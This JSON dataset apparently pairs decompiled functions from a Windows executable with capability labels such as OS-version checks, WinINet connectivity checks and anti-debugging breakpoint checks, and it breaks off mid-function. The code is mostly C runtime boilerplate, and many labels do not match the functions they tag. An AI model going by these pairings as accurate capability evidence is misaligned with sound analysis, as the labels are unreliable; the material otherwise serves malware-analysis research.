{
    "00404197": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404197(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.00404248(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00401360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00401360(void)\n\n{\n    int32_t iVar1;\n    uint extraout_var;\n    \n    if (*0x42da10 == 0) {\n        iVar1 = *0x42da10;\n        fcn.004036c7(0);\n        if (*0x42da10 == 0) {\n            *0x42da0c = *0x42da0c + 1;\n            *0x42da10 = *0x42da0c;\n        }\n        fcn.004036ef(iVar1, extraout_var);\n    }\n    return *0x42da10;\n}\n",
        "token_count": 140
    },
    "004014c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.004014c0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_ESI;\n    \n    iVar1 = *in_EAX;\n    if (unaff_ESI < *(iVar1 + 0xc)) {\n        iVar2 = *(*(iVar1 + 8) + unaff_ESI * 4);\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    else {\n        iVar2 = 0;\n    }\n    if (*(iVar1 + 0x14) != '\\0') {\n        iVar1 = fcn.004033a5();\n        if (unaff_ESI < *(iVar1 + 0xc)) {\n            return *(*(iVar1 + 8) + unaff_ESI * 4);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 206
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004028a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004028a0(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        uVar1 = *(param_1 + 4);\n        if (param_3 != 0) {\n            fcn.00403150(param_1 + 4, 0x10, uVar1, param_3);\n        }\n        fcn.00402910(uVar1, *(param_1 + 0x18) + 1);\n    }\n    *(param_1 + 0x18) = 0xf;\n    fcn.00402ca0(param_3);\n    return;\n}\n",
        "token_count": 177
    },
    "00402930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402930(int32_t param_1)\n\n{\n    uint32_t in_EAX;\n    \n    if (*(param_1 + 0x28) == 0) {\n        in_EAX = in_EAX | 4;\n    }\n    fcn.004018e0(in_EAX, param_1);\n    return;\n}\n",
        "token_count": 78
    },
    "00402cd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nbool __thiscall fcn.00402cd0(int32_t param_1, uint32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    char cVar2;\n    \n    uVar1 = fcn.00402e40();\n    if (uVar1 < param_2) {\n        fcn.00403827();\n    }\n    if (*(param_1 + 0x18) < param_2) {\n        fcn.00402e60(param_2, *(param_1 + 0x14), unaff_EDI, unaff_ESI, unaff_retaddr, param_2, param_3, param_4, param_5\n                     , param_6);\n        return param_2 != 0;\n    }\n    if ((cVar2 != '\\0') && (param_2 < 0x10)) {\n        uVar1 = *(param_1 + 0x14);\n        if (param_2 < *(param_1 + 0x14)) {\n            uVar1 = param_2;\n        }\n        fcn.004028a0(1, uVar1);\n        return param_2 != 0;\n    }\n    if (param_2 == 0) {\n        fcn.00402ca0(0);\n    }\n    return param_2 != 0;\n}\n",
        "token_count": 332
    },
    "00402e40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t fcn.00402e40(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403020();\n    if (uVar1 < 2) {\n        return 1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 63
    },
    "00403180": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403180(uint32_t param_1)\n\n{\n    code *pcVar1;\n    \n    if (param_1 == 0) {\n        param_1 = 0;\n    }\n    else if (0xffffffff / param_1 == 0) {\n        fcn.00401000();\n        fcn.00404f72(&stack0xfffffff0, 0x42a2d0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    fcn.00404602(param_1);\n    return;\n}\n",
        "token_count": 130
    },
    "00404248": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404248(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x429bf8, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        if (*0x5fca114 == 3) {\n            fcn.00409f18(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0040b49e(iVar1);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0040b4ce(arg_8h_00, iVar1);\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0040429e();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x004042d0;\n            iVar1 = *(unaff_EBP + 8);\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42dcb4, 0, iVar1);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004073b3();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00407371(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\ncode_r0x004042d0:\n    fcn.00407441();\n    return;\n}\n",
        "token_count": 430
    },
    "00404bf6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00404bf6(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x404ca1;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00404ccd;\n        uStack36 = *0x42c570 ^ &fcn.00404bf6::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00404bf6::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040a212();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00404bf6::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 722
    },
    "00404ee6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404ee6(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x42c570) {\n        return;\n    }\n    *0x42e258 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x42e25c = &arg_8h;\n    *0x42e198 = 0x10001;\n    *0x42e140 = 0xc0000409;\n    *0x42e144 = 1;\n    var_328h = *0x42c570;\n    var_324h = *0x42c574;\n    *0x42e14c = unaff_retaddr;\n    *0x42e224 = in_GS;\n    *0x42e228 = in_FS;\n    *0x42e22c = in_ES;\n    *0x42e230 = in_DS;\n    *0x42e234 = unaff_EDI;\n    *0x42e238 = unaff_ESI;\n    *0x42e23c = unaff_EBX;\n    *0x42e240 = in_EDX;\n    *0x42e244 = in_ECX;\n    *0x42e248 = in_EAX;\n    *0x42e24c = unaff_EBP;\n    *0x42e250 = unaff_retaddr;\n    *0x42e254 = in_CS;\n    *0x42e260 = in_SS;\n    *0x42e190 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040bf62(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x426378);\n    if (*0x42e190 == 0) {\n        fcn.0040bf62(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 830
    },
    "0040c2e3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040c3d6: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040c3db)\n// WARNING: Removing unreachable block (ram,0x0040c409)\n// WARNING: Removing unreachable block (ram,0x0040c3e1)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040c2e3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004073fc(0x429e30, 0x18);\n    fcn.00409f18(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x42dcf8 != 1) {\n        *0x42dcf4 = 1;\n        *0x42dcf0 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.00409fc6(*0x5fca0ec);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.00409fc6(*0x5fca0e8);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.00409fbd();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.00409fc6(*piVar2);\n                        iVar3 = fcn.00409fbd();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.00409fc6(*0x5fca0ec);\n                        piVar1 = fcn.00409fc6(*0x5fca0e8);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.0040c21d(0x42526c);\n        }\n        fcn.0040c21d(0x425274);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00409e3e(8);\n    }\n    return;\n}\n",
        "token_count": 819
    },
    "0040cf6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040cf6d(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00409e3e(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040d20a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040d20a(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a212();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040a212();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040d4d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d4d2(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.00404e34(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040a212();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040a212();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00404e0d(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.0040d26a(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 386
    },
    "00414047": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00414047(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00409fbd();\n    var_4h = 0;\n    if (*0x42e4fc == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x42e4fc = fcn.00409f4b(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x42e500 = fcn.00409f4b(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x42e504 = fcn.00409f4b(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x42e50c = fcn.00409f4b(uVar3);\n        if (*0x42e50c != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x42e508 = fcn.00409f4b(uVar3);\n        }\n    }\n    if ((*0x42e508 != iVar1) && (*0x42e50c != iVar1)) {\n        pcVar4 = fcn.00409fc6(*0x42e508);\n        pcVar5 = fcn.00409fc6(*0x42e50c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00414189;\n        }\n    }\n    if ((((*0x42e500 != iVar1) && (pcVar4 = fcn.00409fc6(*0x42e500),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x42e504 != iVar1 && (pcVar4 = fcn.00409fc6(*0x42e504),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00414189:\n    pcVar4 = fcn.00409fc6(*0x42e4fc);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 830
    },
    "00421a83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00421a83(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x42c570 ^ &stack0xfffffffc;\n    fcn.00405f90(arg_10h);\n    var_14h = fcn.00422dc2(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042233a(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00421adc:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00421b1c;\n        }\n        if (iVar1 != 2) {\ncode_r0x00421b0e:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00421b1c;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00421b0e;\n        goto code_r0x00421adc;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00421b1c:\n    fcn.00404ee6(unaff_EBX);\n    return;\n}\n",
        "token_count": 506
    },
    "00421b2b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00421b2b(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x42c570 ^ &stack0xfffffffc;\n    fcn.00405f90(arg_10h);\n    var_14h = fcn.00422dc2(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0042287e(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00421b84:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00421bc4;\n        }\n        if (iVar1 != 2) {\ncode_r0x00421bb6:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00421bc4;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00421bb6;\n        goto code_r0x00421b84;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00421bc4:\n    fcn.00404ee6(unaff_EBX);\n    return;\n}\n",
        "token_count": 504
    },
    "0042233a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042233a(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x0042283b;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = str.5_v_[0] + L'\\xffffffff';\n        iVar4 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        uVar9 = str.5_v_[0] & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x0042246f;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00422476;\ncode_r0x0042246f:\n                        do {\n                            var_4h = 1;\ncode_r0x00422476:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00422484;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        